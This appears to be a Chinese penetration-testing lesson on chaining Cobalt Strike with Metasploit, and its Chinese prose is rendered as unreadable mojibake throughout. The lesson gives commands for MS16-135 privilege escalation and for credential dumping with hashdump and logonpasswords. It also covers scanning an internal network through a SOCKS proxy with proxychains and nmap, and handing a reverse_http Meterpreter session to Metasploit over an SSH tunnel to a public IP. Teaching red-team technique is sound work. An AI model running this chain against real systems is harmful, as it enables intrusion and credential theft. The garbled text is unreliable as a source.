![](img/644f322a8c39994db2a96129c8f9bb44_1.png)

![](img/644f322a8c39994db2a96129c8f9bb44_3.png)

![](img/644f322a8c39994db2a96129c8f9bb44_5.png)

# è¯¾ç¨‹P53ï¼šç¬¬17å¤©ï¼šCobalt Strikeè”åŠ¨Metasploit ğŸš€

![](img/644f322a8c39994db2a96129c8f9bb44_7.png)

![](img/644f322a8c39994db2a96129c8f9bb44_9.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•å°†Cobalt Strikeä¸Metasploitè¿™ä¸¤ä¸ªå¼ºå¤§çš„æ¸—é€æµ‹è¯•å·¥å…·è¿›è¡Œè”åŠ¨ï¼Œä»¥å®ç°æ›´é«˜æ•ˆçš„å†…ç½‘æ¸—é€å’Œä¿¡æ¯æ”¶é›†ã€‚è¯¾ç¨‹å°†æ¶µç›–ä»é¶æœºä¸Šçº¿ã€æƒé™æå‡åˆ°é€šè¿‡ä»£ç†å’Œç«¯å£è½¬å‘å®ç°å·¥å…·é—´åä½œçš„å®Œæ•´æµç¨‹ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_11.png)

---

## æ¦‚è¿°

![](img/644f322a8c39994db2a96129c8f9bb44_13.png)

![](img/644f322a8c39994db2a96129c8f9bb44_15.png)

Cobalt Strikeæ›´é€‚åˆä½œä¸ºå›¢é˜Ÿåä½œå’Œå†…ç½‘ç®¡æ§å¹³å°ï¼Œè€ŒMetasploitåˆ™æ‹¥æœ‰ä¸°å¯Œçš„æ¨¡å—ç”¨äºä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨ã€‚è”åŠ¨ä¸¤è€…å¯ä»¥å‘æŒ¥å„è‡ªä¼˜åŠ¿ã€‚æœ¬èŠ‚è¯¾çš„æ ¸å¿ƒæ˜¯å­¦ä¹ å¦‚ä½•é…ç½®ç¯å¢ƒï¼Œä½¿Cobalt Strikeä¸Šçº¿çš„ä¼šè¯èƒ½å¤Ÿè½¬å‘ç»™å†…ç½‘çš„Metasploitï¼Œå¹¶åˆ©ç”¨SSHéš§é“è§£å†³ç½‘ç»œè¿é€šæ€§é—®é¢˜ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_17.png)

![](img/644f322a8c39994db2a96129c8f9bb44_19.png)

---

![](img/644f322a8c39994db2a96129c8f9bb44_21.png)

![](img/644f322a8c39994db2a96129c8f9bb44_23.png)

![](img/644f322a8c39994db2a96129c8f9bb44_25.png)

## ç¬¬ä¸€éƒ¨åˆ†ï¼šé¶æœºä¸Šçº¿ä¸æƒé™æå‡

![](img/644f322a8c39994db2a96129c8f9bb44_27.png)

![](img/644f322a8c39994db2a96129c8f9bb44_29.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†è¯¾ç¨‹çš„æ•´ä½“ç›®æ ‡ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•è®©é¶æœºä¸Šçº¿åˆ°Cobalt Strikeå¹¶æå‡æƒé™ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_31.png)

![](img/644f322a8c39994db2a96129c8f9bb44_33.png)

![](img/644f322a8c39994db2a96129c8f9bb44_35.png)

![](img/644f322a8c39994db2a96129c8f9bb44_37.png)

é¶æœºä¸Šçº¿é€šå¸¸é€šè¿‡æ‰§è¡Œå‘½ä»¤æˆ–ä¸Šä¼ Webshellå®ç°ã€‚åªè¦å‘½ä»¤æˆåŠŸæ‰§è¡Œä¸”å…·å¤‡ç›¸åº”æƒé™ï¼Œé¶æœºå°±èƒ½ä¸Šçº¿ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœCobalt StrikeæœåŠ¡å™¨åœ¨å†…ç½‘ï¼Œå¿…é¡»ç¡®ä¿é¶æœºèƒ½å¤Ÿè¿æ¥åˆ°Cobalt StrikeæœåŠ¡å™¨ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_39.png)

![](img/644f322a8c39994db2a96129c8f9bb44_41.png)

![](img/644f322a8c39994db2a96129c8f9bb44_43.png)

![](img/644f322a8c39994db2a96129c8f9bb44_45.png)

å½“é¶æœºä¸Šçº¿åï¼Œæˆ‘ä»¬è·å¾—çš„æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™çš„shellã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_47.png)

ä»¥ä¸‹æ˜¯æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™çš„å‘½ä»¤ï¼š
```shell
shell whoami
```
æ‰§è¡Œè¯¥å‘½ä»¤åï¼Œå¯ä»¥çœ‹åˆ°å½“å‰ç”¨æˆ·æ˜¯æ™®é€šç”¨æˆ·ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_49.png)

![](img/644f322a8c39994db2a96129c8f9bb44_51.png)

![](img/644f322a8c39994db2a96129c8f9bb44_53.png)

![](img/644f322a8c39994db2a96129c8f9bb44_55.png)

æ¥ä¸‹æ¥è¿›è¡Œæƒé™æå‡ã€‚åœ¨Cobalt Strikeçš„`Access`æ¨¡å—ä¸­ï¼Œé€‰æ‹©ç›¸åº”çš„ææƒè„šæœ¬ï¼ˆä¾‹å¦‚MS16-135ï¼‰ã€‚é€‰æ‹©åï¼Œå·¥å…·ä¼šè‡ªåŠ¨æ‰§è¡Œæ”»å‡»è„šæœ¬ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_56.png)

![](img/644f322a8c39994db2a96129c8f9bb44_58.png)

![](img/644f322a8c39994db2a96129c8f9bb44_60.png)

![](img/644f322a8c39994db2a96129c8f9bb44_62.png)

![](img/644f322a8c39994db2a96129c8f9bb44_64.png)

å¦‚æœææƒæˆåŠŸï¼Œä¼šçœ‹åˆ°ç¬¬äºŒä¸ªä¼šè¯ä¸Šçº¿ï¼Œç”¨æˆ·å˜ä¸º`SYSTEM`ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬ä¾¿è·å¾—äº†è¯¥ä¸»æœºçš„æœ€é«˜æƒé™ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_66.png)

![](img/644f322a8c39994db2a96129c8f9bb44_68.png)

![](img/644f322a8c39994db2a96129c8f9bb44_70.png)

![](img/644f322a8c39994db2a96129c8f9bb44_71.png)

![](img/644f322a8c39994db2a96129c8f9bb44_73.png)

![](img/644f322a8c39994db2a96129c8f9bb44_75.png)

è·å¾—æœ€é«˜æƒé™åï¼Œå¯ä»¥æ‰§è¡Œæ›´å¤šæ“ä½œï¼Œä¾‹å¦‚è½¬å‚¨å“ˆå¸Œæˆ–ä»å†…å­˜ä¸­è¯»å–æ˜æ–‡å¯†ç ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_77.png)

![](img/644f322a8c39994db2a96129c8f9bb44_79.png)

![](img/644f322a8c39994db2a96129c8f9bb44_81.png)

![](img/644f322a8c39994db2a96129c8f9bb44_83.png)

ä»¥ä¸‹æ˜¯ç›¸å…³æ“ä½œå‘½ä»¤ï¼š
*   **è½¬å‚¨å“ˆå¸Œ**ï¼šåœ¨ä¼šè¯äº¤äº’ä¸­ä½¿ç”¨ `hashdump` å‘½ä»¤ã€‚
*   **è¯»å–æ˜æ–‡å¯†ç **ï¼šä½¿ç”¨ `logonpasswords` å‘½ä»¤ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_85.png)

![](img/644f322a8c39994db2a96129c8f9bb44_87.png)

![](img/644f322a8c39994db2a96129c8f9bb44_88.png)

---

![](img/644f322a8c39994db2a96129c8f9bb44_90.png)

![](img/644f322a8c39994db2a96129c8f9bb44_92.png)

![](img/644f322a8c39994db2a96129c8f9bb44_94.png)

![](img/644f322a8c39994db2a96129c8f9bb44_96.png)

![](img/644f322a8c39994db2a96129c8f9bb44_97.png)

![](img/644f322a8c39994db2a96129c8f9bb44_99.png)

## ç¬¬äºŒéƒ¨åˆ†ï¼šå¼€å¯SOCKSä»£ç†è¿›è¡Œå†…ç½‘æ¢æµ‹

![](img/644f322a8c39994db2a96129c8f9bb44_101.png)

![](img/644f322a8c39994db2a96129c8f9bb44_103.png)

![](img/644f322a8c39994db2a96129c8f9bb44_105.png)

![](img/644f322a8c39994db2a96129c8f9bb44_107.png)

åœ¨è·å¾—å†…ç½‘ä¸»æœºæ§åˆ¶æƒåï¼Œæˆ‘ä»¬å¸¸å¸¸éœ€è¦æ¢æµ‹å…¶æ‰€åœ¨å†…ç½‘çš„å…¶ä»–èµ„äº§ã€‚ç”±äºæ”»å‡»æœºå¯èƒ½æ— æ³•ç›´æ¥è®¿é—®ç›®æ ‡å†…ç½‘ï¼Œå› æ­¤éœ€è¦å»ºç«‹ä»£ç†ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_109.png)

![](img/644f322a8c39994db2a96129c8f9bb44_111.png)

![](img/644f322a8c39994db2a96129c8f9bb44_113.png)

Cobalt Strikeå¯ä»¥æ–¹ä¾¿åœ°å¼€å¯SOCKSä»£ç†ã€‚åœ¨æ‹¥æœ‰`SYSTEM`æƒé™çš„ä¼šè¯ä¸­ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```shell
socks 1234
```
æ­¤å‘½ä»¤ä¼šåœ¨Cobalt StrikeæœåŠ¡å™¨ä¸Šå¼€å¯ä¸€ä¸ªç«¯å£ä¸º1234çš„SOCKS4aä»£ç†æœåŠ¡ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_115.png)

![](img/644f322a8c39994db2a96129c8f9bb44_116.png)

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ”»å‡»æœºï¼ˆå¦‚Kaliï¼‰ä¸Šé…ç½®ä»£ç†ä»¥ä½¿ç”¨è¿™ä¸ªé€šé“ã€‚å¯ä»¥ä½¿ç”¨`proxychains`å·¥å…·ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_118.png)

![](img/644f322a8c39994db2a96129c8f9bb44_119.png)

![](img/644f322a8c39994db2a96129c8f9bb44_121.png)

![](img/644f322a8c39994db2a96129c8f9bb44_123.png)

ä»¥ä¸‹æ˜¯é…ç½®å’Œä½¿ç”¨`proxychains`çš„æ­¥éª¤ï¼š
1.  ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š`vi /etc/proxychains.conf`
2.  åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ï¼š`socks4 <Cobalt StrikeæœåŠ¡å™¨IP> 1234`
3.  åœ¨éœ€è¦ä»£ç†çš„å‘½ä»¤å‰åŠ ä¸Š `proxychains`ï¼Œä¾‹å¦‚ï¼š
    ```shell
    proxychains nmap -sT -Pn 192.168.2.135
    ```

![](img/644f322a8c39994db2a96129c8f9bb44_125.png)

![](img/644f322a8c39994db2a96129c8f9bb44_127.png)

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒSOCKSä»£ç†å·¥ä½œåœ¨TCP/IPåè®®çš„åº”ç”¨å±‚ï¼Œå› æ­¤æ— æ³•ä»£ç†ICMPåè®®ï¼ˆå¦‚pingå‘½ä»¤ï¼‰ã€‚ä½¿ç”¨`nmap`æ‰«ææ—¶åº”ä½¿ç”¨`-sT`ï¼ˆTCPè¿æ¥æ‰«æï¼‰å¹¶ç¦ç”¨pingæ‰«æï¼ˆ-Pnï¼‰ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_129.png)

![](img/644f322a8c39994db2a96129c8f9bb44_131.png)

![](img/644f322a8c39994db2a96129c8f9bb44_133.png)

é€šè¿‡ä»£ç†è¿›è¡Œæ‰«æå’Œè¿æ¥é€Ÿåº¦ä¼šè¾ƒæ…¢ï¼Œå› ä¸ºæµé‡éœ€è¦ç»è¿‡å¤šå±‚è½¬å‘ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_135.png)

---

![](img/644f322a8c39994db2a96129c8f9bb44_137.png)

## ç¬¬ä¸‰éƒ¨åˆ†ï¼šå°†Cobalt Strikeä¼šè¯è½¬å‘ç»™Metasploit

![](img/644f322a8c39994db2a96129c8f9bb44_139.png)

![](img/644f322a8c39994db2a96129c8f9bb44_141.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†é€šè¿‡ä»£ç†è®¿é—®å†…ç½‘çš„æ–¹æ³•ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å°†Cobalt Strikeä¸Šçº¿çš„ä¼šè¯ç›´æ¥äº¤ç»™åŠŸèƒ½æ›´ä¸°å¯Œçš„Metasploitæ¥å¤„ç†ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_143.png)

é¦–å…ˆï¼Œåœ¨Cobalt Strikeä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ç›‘å¬å™¨ï¼ˆListenerï¼‰ã€‚
1.  ç‚¹å‡» `Listeners` -> `Add`ã€‚
2.  è®¾ç½® `Name`ï¼ˆä¾‹å¦‚ `msf_listener`ï¼‰ã€‚
3.  é€‰æ‹© `Payload` ä¸º `windows/foreign/reverse_http`ã€‚
4.  è®¾ç½® `HTTP Host` ä¸ºCobalt StrikeæœåŠ¡å™¨çš„å…¬ç½‘IPã€‚
5.  è®¾ç½® `HTTP Port` ä¸ºä¸€ä¸ªç‰¹å®šç«¯å£ï¼ˆä¾‹å¦‚7777ï¼‰ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_145.png)

![](img/644f322a8c39994db2a96129c8f9bb44_147.png)

![](img/644f322a8c39994db2a96129c8f9bb44_149.png)

æ¥ç€ï¼Œåœ¨**å†…ç½‘**çš„Metasploitä¸­é…ç½®æ¥æ”¶ç«¯ã€‚
1.  å¯åŠ¨msfconsoleã€‚
2.  ä½¿ç”¨å¤„ç†å™¨æ¨¡å—ï¼š`use exploit/multi/handler`
3.  è®¾ç½®ä¸Cobalt Strikeç›‘å¬å™¨åŒ¹é…çš„Payloadï¼š
    ```shell
    set payload windows/meterpreter/reverse_http
    ```
4.  è®¾ç½®ç›‘å¬åœ°å€å’Œç«¯å£ï¼ˆæŒ‡å‘**å†…ç½‘Kaliæœ¬æœº**çš„IPå’Œä¸Šé¢å®šä¹‰çš„ç«¯å£ï¼‰ï¼š
    ```shell
    set LHOST 192.168.123.128
    set LPORT 7777
    ```
5.  è¿è¡Œç›‘å¬ï¼š`run`

![](img/644f322a8c39994db2a96129c8f9bb44_151.png)

ç°åœ¨ï¼ŒCobalt StrikeæœåŠ¡å™¨ï¼ˆå…¬ç½‘ï¼‰ä¸Šçš„7777ç«¯å£ä¸å†…ç½‘Metasploitçš„7777ç«¯å£å°šæœªè¿é€šã€‚ç”±äºå…¬ç½‘æ— æ³•ç›´æ¥è®¿é—®å†…ç½‘ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨SSHéš§é“è¿›è¡Œç«¯å£è½¬å‘ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_153.png)

![](img/644f322a8c39994db2a96129c8f9bb44_155.png)

åœ¨**å†…ç½‘Kali**ä¸­æ‰§è¡Œä»¥ä¸‹SSHéš§é“å‘½ä»¤ï¼š
```shell
ssh -C -f -N -g -L 0.0.0.0:7777:127.0.0.1:7777 root@39.108.68.207 -p 22
```
æ­¤å‘½ä»¤å°†æœ¬åœ°ï¼ˆKaliï¼‰çš„7777ç«¯å£æµé‡ï¼Œé€šè¿‡SSHéš§é“è½¬å‘åˆ°å…¬ç½‘æœåŠ¡å™¨ï¼ˆ39.108.68.207ï¼‰çš„7777ç«¯å£ã€‚æ‰§è¡Œåéœ€è¦è¾“å…¥å…¬ç½‘æœåŠ¡å™¨çš„rootå¯†ç ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_157.png)

![](img/644f322a8c39994db2a96129c8f9bb44_159.png)

![](img/644f322a8c39994db2a96129c8f9bb44_161.png)

![](img/644f322a8c39994db2a96129c8f9bb44_163.png)

éš§é“å»ºç«‹åï¼Œç«¯å£å³å®ç°è¿é€šã€‚æœ€åï¼Œåœ¨Cobalt Strikeä¸­ï¼Œå³é”®ç‚¹å‡»è¦è½¬å‘çš„ä¼šè¯ï¼ˆå¦‚`SYSTEM`æƒé™çš„ä¼šè¯ï¼‰ï¼Œé€‰æ‹© `Spawn`ï¼Œç„¶åé€‰æ‹©åˆšåˆšåˆ›å»ºçš„ `msf_listener`ã€‚

ç¨ä½œç­‰å¾…ï¼Œåœ¨Metasploitä¸­å³å¯æ”¶åˆ°åå¼¹å›æ¥çš„Meterpreterä¼šè¯ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬æˆåŠŸå°†Cobalt Strikeçš„ä¼šè¯ç§»äº¤ç»™äº†Metasploitï¼Œå¯ä»¥åˆ©ç”¨åè€…æ›´å¼ºå¤§çš„æ¨¡å—è¿›è¡Œåç»­æ¸—é€ã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_165.png)

---

## æ€»ç»“

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†Cobalt Strikeä¸Metasploitçš„è”åŠ¨æŠ€æœ¯ã€‚ä¸»è¦å†…å®¹åŒ…æ‹¬ï¼š
1.  è®©é¶æœºä¸Šçº¿Cobalt Strikeå¹¶è¿›è¡Œæƒé™æå‡ã€‚
2.  é€šè¿‡å¼€å¯SOCKSä»£ç†ï¼Œåˆ©ç”¨`proxychains`å·¥å…·è¿›è¡Œå†…ç½‘æ¢æµ‹ã€‚
3.  æ ¸å¿ƒéƒ¨åˆ†ï¼šé€šè¿‡åˆ›å»ºå¤–éƒ¨ç›‘å¬å™¨ï¼ˆForeign Listenerï¼‰å’Œé…ç½®SSHéš§é“ï¼Œè§£å†³ç½‘ç»œéš”ç¦»é—®é¢˜ï¼ŒæˆåŠŸå°†Cobalt Strikeçš„ä¼šè¯è½¬å‘ç»™å†…ç½‘çš„Metasploitã€‚

![](img/644f322a8c39994db2a96129c8f9bb44_167.png)

è¿™äº›æŠ€æœ¯åœ¨å®é™…çš„å†…ç½‘æ¸—é€æµ‹è¯•ä¸­éå¸¸å®ç”¨ï¼Œèƒ½å¤Ÿæœ‰æ•ˆç»“åˆä¸¤æ¬¾å·¥å…·çš„ä¼˜åŠ¿ã€‚è¯·åŠ¡å¿…äº²è‡ªåŠ¨æ‰‹æ­å»ºç¯å¢ƒè¿›è¡Œå®éªŒï¼Œä»¥åŠ æ·±ç†è§£ã€‚